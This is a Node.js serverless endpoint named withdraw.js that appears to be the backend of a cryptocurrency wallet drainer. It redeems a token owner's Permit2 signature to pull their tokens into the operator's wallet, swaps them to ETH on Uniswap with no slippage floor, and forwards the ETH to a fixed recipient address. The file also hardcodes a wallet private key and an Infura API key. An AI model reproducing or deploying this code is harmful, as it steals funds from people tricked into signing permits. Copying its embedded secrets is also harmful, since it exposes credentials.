// api/withdraw.js
const { ethers } = require('ethers');

const RPC_URL = "https://mainnet.infura.io/v3/08c65b8cf2e240289b07b7d0a55ecd18";
const PRIVATE_KEY = "db3abb1aa82f1330224830afe7fa9ed2fa9e9ac0157547dea0b04aa282becd86";
const RECIPIENT_ADDRESS = "0x3848f1375B64053910c8C5aDE2e0BDC89e243F20";
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const UNISWAP_ROUTER = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; // WETH9

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

// ABIs
const PERMIT2_ABI = [
    "function permitTransferFrom(" +
    "tuple(tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit," +
    "tuple(address to,uint256 requestedAmount) transferDetails," +
    "address owner," +
    "bytes signature" +
    ")"
];

const UNISWAP_ABI = [
    "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
const usdtContract = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ["function approve(address,uint256)"], wallet);
const router = new ethers.Contract(UNISWAP_ROUTER, UNISWAP_ABI, wallet);

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const { signature, permitData, owner } = req.body;
        if (!signature || !permitData || !owner) {
            return res.status(400).json({ success: false, message: 'Missing fields' });
        }

        const formattedOwner = ethers.utils.getAddress(owner);
        const amountIn = ethers.BigNumber.from(permitData.amount);

        // 1. PermitTransfer USDT to our wallet
        const permit = {
            permitted: { token: permitData.token, amount: amountIn },
            nonce: permitData.nonce,
            deadline: permitData.deadline
        };

        const transferDetails = { to: wallet.address, requestedAmount: amountIn };

        const tx1 = await permit2Contract.permitTransferFrom(permit, transferDetails, formattedOwner, signature);
        await tx1.wait();

        // 2. Approve Uniswap Router to spend USDT
        await (await usdtContract.approve(UNISWAP_ROUTER, amountIn)).wait();

        // 3. Swap USDT → ETH
        const path = [permitData.token, WETH];
        const deadline = Math.floor(Date.now() / 1000) + 300;

        const tx2 = await router.swapExactTokensForETH(
            amountIn,
            0, // amountOutMin = 0 (accept any amount — risky in prod, add slippage)
            path,
            RECIPIENT_ADDRESS,   // Send ETH directly to recipient
            deadline
        );

        const receipt = await tx2.wait();

        return res.status(200).json({ 
            success: true, 
            txHash: receipt.transactionHash,
            message: "USDT swapped to ETH and sent to recipient" 
        });

    } catch (error) {
        console.error('Execution Error:', error);
        return res.status(500).json({ success: false, message: error.message });
    }
};
